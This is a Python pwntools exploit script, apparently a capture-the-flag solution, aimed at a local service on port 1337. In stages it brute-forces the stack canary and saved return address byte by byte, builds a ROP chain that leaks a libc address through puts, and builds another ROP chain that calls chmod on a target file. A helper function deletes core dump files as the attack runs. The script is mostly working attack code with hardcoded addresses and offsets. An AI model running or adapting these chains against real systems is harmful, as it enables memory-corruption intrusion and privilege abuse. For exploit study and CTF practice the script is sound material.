from pwn import *
import os
import glob
from time import sleep

def delete_core_files(directory="."):
    """
    Deletes files matching the pattern 'core.*' in the specified directory.

    Args:
        directory (str): The path to the directory to clean.
                         Defaults to the current working directory ('.').

    Returns:
        list: A list of paths to the files that were successfully deleted.
    """
    deleted_files = []
    # Construct the full path pattern for core files
    # os.path.join handles different operating system path separators
    core_file_pattern = os.path.join(directory, "core.*")

    print(f"Searching for files matching '{core_file_pattern}'...")

    # Use glob to find all files matching the pattern
    # glob.glob returns a list of paths matching the pattern
    files_to_delete = glob.glob(core_file_pattern)

    if not files_to_delete:
        print(f"No 'core.*' files found in '{directory}'.")
        return deleted_files

    print(f"Found {len(files_to_delete)} 'core.*' files to delete:")
    for file_path in files_to_delete:
        print(f"  - {file_path}")

    # Iterate through the found files and attempt to delete each one
    for file_path in files_to_delete:
        try:
            os.remove(file_path)
            print(f"Successfully deleted: {file_path}")
            deleted_files.append(file_path)
        except OSError as e:
            # Handle potential errors during deletion (e.g., permission denied, file in use)
            print(f"Error deleting {file_path}: {e}")
        except Exception as e:
            # Catch any other unexpected errors
            print(f"An unexpected error occurred while deleting {file_path}: {e}")

    print("Deletion process complete.")
    return deleted_files

"""
# Stage - 1

bruteforced_canary = b""

while(len(bruteforced_canary) <= 8):
	for i in range(0x00, 0xff+1):
		p = remote("localhost", 1337)

		byte = int.to_bytes(i)

		payload = b""
		payload += b"A" * (56-16) # buffer
		payload += (bruteforced_canary + byte) # canary

		p.send(payload)

		res = p.recvall()

		p.close()

		if(b"stack smashing") not in res:
			print("------------- FOUND -------------")
			print("[+] Found a byte :: {}".format(byte))
			bruteforced_canary += byte
			print("[+] Canary Till Now :: {}".format(bruteforced_canary))
			print()
			continue
		else:
			print("[!] Trying byte {}".format(byte))
			print("[+] Canary Till Now :: {}".format(bruteforced_canary))

		delete_core_files()

print("[+] Leaked Canary :: {}".format(bruteforced_canary[0:8]))
print("[+] Actual Canary Value :: {}".format(hex(int.from_bytes(bruteforced_canary[0:8][::-1]))))
"""

"""
# Stage - 2
bruteforced_canary = p64(0x7ecc13a3ec4b6200)
saved_rip = b""

while(len(saved_rip) <= 8):
	sleep(0.1)
	for i in range(0x00, 0xff+1):
		p = remote("localhost", 1337)

		byte = int.to_bytes(i)

		payload = b""
		payload += b"A" * (56-16) # buffer
		payload += bruteforced_canary # canary
		payload += b"B" * 8 # saved_rbp
		payload += (saved_rip + byte) # ret_addr

		p.send(payload)

		res = p.clean()
		print(res)

		p.close()

		if(b"### Goodbye!") in res:
			print("------------- FOUND -------------")
			print("[+] Found a byte :: {}".format(byte))
			saved_rip += byte
			print("[+] saved_rip Till Now :: {}".format(saved_rip))
			print()
			continue
		else:
			print("[!] Trying byte {}".format(byte))
			print("[+] saved_rip Till Now :: {}".format(saved_rip))

		delete_core_files()

print("[+] Leaked RIP :: {}".format(saved_rip[0:8]))
print("[+] Actual RIP Value :: {}".format(hex(int.from_bytes(saved_rip[0:8][::-1]))))
"""

# Stage - 3
bruteforced_canary = p64(0x7ecc13a3ec4b6200)
saved_rip = 0x5647791e961c

pop_rdi_ret = p64(saved_rip + 0x97) # 0x97 = |(entry_base - saved_rip) - gadget_offset)|
puts_plt = p64(saved_rip - 0x4cc) # 0x4cc = |(saved_rip - puts@plt)|
puts_got = p64(saved_rip + 0x2944) # 0x2944 = |(saved_rip - puts@got)|

payload = b""
payload += b"A" * (56-16) # buffer
payload += bruteforced_canary # canary
payload += b"B" * 8 # saved_rbp
payload += pop_rdi_ret # to_setup_puts@plt
payload += puts_got
payload += puts_plt # puts@plt(puts@got)

p = remote("localhost", 1337)
p.send(payload)

puts_at_libc = int.from_bytes(p.clean().split(b"Leaving!\n")[1].split(b"\n")[0][::-1])
print("[+] puts@libc addr :: " + hex(puts_at_libc))

p.close()

"""
# Stage - 4
bruteforced_canary = p64(0x7ecc13a3ec4b6200)
saved_rip = 0x5647791e961c

puts_at_libc = 0x7f7d431f75a0
chmod_at_libc = puts_at_libc + 0x7f160 # 0x7f160 = |puts.offset - chmod.offset|

pop_rdi_ret = p64(saved_rip + 0x97)
pop_rsi_ret = p64(saved_rip + 0x95)
filename = p64(saved_rip + 0xaaa)
mode = p64(0x4)

payload = b""
payload += b"A" * (56-16) # buffer
payload += bruteforced_canary # canary
payload += b"B" * 8 # saved_rbp
payload += pop_rdi_ret
payload += filename
payload += pop_rsi_ret
payload += mode
payload += p64(0x0) # into r15
payload += p64(chmod_at_libc)
payload += p64(saved_rip)

p = remote("localhost", 1337)
p.send(payload)

print(p.clean())

p.close()
"""